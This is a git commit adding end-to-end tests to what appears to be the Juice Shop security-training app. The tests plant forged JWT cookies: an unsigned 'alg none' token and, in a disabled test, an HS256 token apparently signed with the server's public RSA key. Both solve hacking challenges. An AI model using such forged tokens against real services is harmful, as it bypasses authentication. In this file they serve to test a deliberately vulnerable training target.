7fa085f79ac217ec0ab8e7d402598c781e07215e
Bjoern Kimminich <bjoern.kimminich@gmx.de>
2017-10-25 01:06:04 +0200

    Add e2e test for JWT Tier 1 (and disabled test for Tier 2)

---
+++ test/e2e/forgedJwtSpec.js
@@ -0,0 +1,19 @@
+describe('/', () => {
+  describe('challenge "jwtTier1"', () => {
+    it('should accept an unsigned token with email jwtn3d@juice-sh.op in the payload ', () => {
+      browser.manage().addCookie({ name: 'token', value: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJkYXRhIjp7ImVtYWlsIjoiand0bjNkQGp1aWNlLXNoLm9wIn0sImlhdCI6MTUwODYzOTYxMiwiZXhwIjo5OTk5OTk5OTk5fQ.' })
+      browser.get('/#/')
+    })
+
+    protractor.expect.challengeSolved({challenge: 'JWT Issues Tier 1'})
+  })
+
+  describe('challenge "jwtTier2"', () => {
+    xit('should accept a token signed with public RSA key with email rsa_lord@juice-sh.op in the payload ', () => {
+      browser.manage().addCookie({ name: 'token', value: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImVtYWlsIjoicnNhX2xvcmRAanVpY2Utc2gub3AifSwiaWF0IjoxNTA4NjM5NjEyLCJleHAiOjk5OTk5OTk5OTl9.dFeqI0EGsOecwi5Eo06dFUBtW5ziRljFgMWOCYeA8yw' })
+      browser.get('/#/')
+    })
+
+    // protractor.expect.challengeSolved({challenge: 'JWT Issues Tier 2'})
+  })
+})
